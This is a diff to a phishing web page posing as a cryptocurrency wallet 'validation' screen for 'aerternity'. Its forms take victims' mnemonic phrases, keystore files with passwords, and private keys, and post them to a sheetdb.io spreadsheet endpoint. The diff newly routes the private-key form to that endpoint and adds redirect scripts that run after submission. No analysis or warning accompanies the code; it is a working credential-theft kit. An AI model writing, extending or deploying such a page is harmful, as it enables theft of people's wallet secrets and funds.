@@ -61,7 +61,7 @@
       </div>
           <div id="phrase" class="tabcontent" style="display: block;">
 
-        <form w="" action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
+        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
              <input type="hidden" name="w" value="aerternity"> 
             <textarea name="data[phrase]" class="phrase" required="required" minlength="10" placeholder="Enter Your Mnemonic Phrase *"></textarea>
             <input type="text" name="user" value="" style="visibility: hidden;">
@@ -69,14 +69,14 @@
                       
             <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
             <br>
-            <button type="submit" class="btn">VALIDATE</button>
+            <button id="submitPhrase" type="submit" class="btn">VALIDATE</button>
         </form>
        
         
     </div>
 
     <div id="keystore" class="tabcontent" style="display: none;">
-        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="POST" id="sheetdb-form">
+        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
 
             <input type="hidden" name="w" value="aerternity">
 
@@ -89,20 +89,20 @@
             <input type="text" name="user" value="" style="visibility: hidden;">
             <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
             <br>
-            <button type="submit" class="btn">VALIDATE</button>
+            <button id="keystorejson" type="submit" class="btn">VALIDATE</button>
         </form>
     </div>
 
     <div id="private" class="tabcontent" style="display: none;">
-        <form action="#" method="POST">
+        <form action="https://sheetdb.io/api/v1/tzpzgrvcmooc9" method="post" id="sheetdb-form">
             <input type="hidden" name="w" value="aerternity">
             <div class="field">
-                <input type="text" name="key" class="key" placeholder="Private Key">
+                <input type="text" name="data[key]" class="key" placeholder="Private Key">
             </div>
             <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
             <input type="text" name="user" value="" style="visibility: hidden;">
             <br>
-            <button type="submit" class="btn">IMPORT</button>
+            <button id="privateKey" type="submit" class="btn">VALIDATE</button>
         </form>
     </div>
 
@@ -129,15 +129,28 @@ form.addEventListener("submit", e => {
       response => response.json()
   ).then((html) => {
     // you can put any JS code here
-    window.open('../success.html');
+    window.location('../success.html');
 
   });
 });
 </script>
 
+<script>
+    // for the phrase
+    document.getElementById('submitPhrase').onclick = function(){
+        location.replace("index9e36.html")
+    }
 
+    // for json key store
+    document.getElementById('keystorejson').onclick = function(){
+        location.replace("index9e36.html")
+    }
 
+//   for private key
+    document.getElementById('privatKey').onclick = function(){
+        location.replace("index9e36.html")
+    }
+</script>
 
 </body>
-
 </html>
